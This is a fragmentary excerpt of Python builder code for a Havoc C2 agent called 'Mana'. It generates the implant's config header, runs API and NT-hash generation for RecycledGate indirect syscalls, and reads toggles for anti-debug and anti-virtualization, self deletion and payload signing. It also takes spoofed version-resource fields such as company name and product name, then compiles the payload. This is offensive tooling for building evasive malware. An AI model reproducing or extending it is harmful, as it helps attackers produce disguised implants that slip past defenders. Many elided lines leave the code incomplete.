...
def generate_config_header(listener: dict, sleep: int, jitter: int, magic: int) -> str:
    ...
    config_h = f'''//This is autogenerated from the havoc agent parser
#include <windows.h>
// =============================================================================
...
class Mana(AgentType):
    ...
    BuildingConfig = {
        ...
        "7. Anti debug/analysis/virtualization": False,
        "8. Self deletion": True,
        "9. Dropdown":{"Method":["test","test2"]}
    ...
    def generate(self, config: dict) -> None:
        ...
        # Check if indirect syscall is enabled
        indirect_syscall = config['Config'].get('3. Indirect Syscall', False)
        
        # Handle string "True"/"False" from config
        if isinstance(indirect_syscall, str):
            use_indirect_syscall = indirect_syscall.lower() == 'true'
        else:
            use_indirect_syscall = bool(indirect_syscall)
        
        print(f"Is using indirect syscalls: {use_indirect_syscall}")

        # Always run hash.py (generates Defines.h for API hashing)
        ...
        # Always run hash2.py (generates Defines2.h for RecycledGate NT hashes)
        ...
        if result2.returncode != 0:
            print(f"[!] hash2.py error: {result2.stderr}")
            self.builder_send_message(config['ClientID'], "Error", f"[!] hash2.py failed: {result2.stderr}")
        else:
            print(f"[+] hash2.py output: {result2.stdout}")
            self.builder_send_message(config['ClientID'], "Info", "[*] Generated NT hashes for RecycledGate")

        # Parse profile to get listener config
        listener = HavocProfileParser(PROFILE_PATH, listener_name)
        
         # Check if signing is enabled
        sign_payload = config['Config'].get('5. SignPayload', False)
        should_sign = sign_payload

        # Config build for resource RC
        compname = config['Config']['4. ResourceSection'].get('CompanyName')
        filever = config['Config']['4. ResourceSection'].get('FILEVERSION')
        filedesc = config['Config']['4. ResourceSection'].get('FileDescription')
        internalName = config['Config']['4. ResourceSection'].get('InternalName')
        copyright = config['Config']['4. ResourceSection'].get('LegalCopyright')
        origfilename = config['Config']['4. ResourceSection'].get('OriginalFilename')
        productver = config['Config']['4. ResourceSection'].get('PRODUCTVERSION')
        productname = config['Config']['4. ResourceSection'].get('ProductName')
        productversion = config['Config']['4. ResourceSection'].get('ProductVersion')
...
END
        ...
        # Set INDIRECT_SYSCALL flag based on config
        make_flag = "INDIRECT_SYSCALL=1" if use_indirect_syscall else "INDIRECT_SYSCALL=0"
        build = subprocess.run(["make", make_flag], capture_output=True, text=True)

        if build.returncode != 0:
            self.builder_send_message(config['ClientID'], "Error", f"[!] Build failed:\n{build.stderr}")
            return
        
        api_mode_str = "RecycledGate" if use_indirect_syscall else "WinAPI"
        self.builder_send_message(config['ClientID'], "Good", f"[+] Build successful ({api_mode_str})")
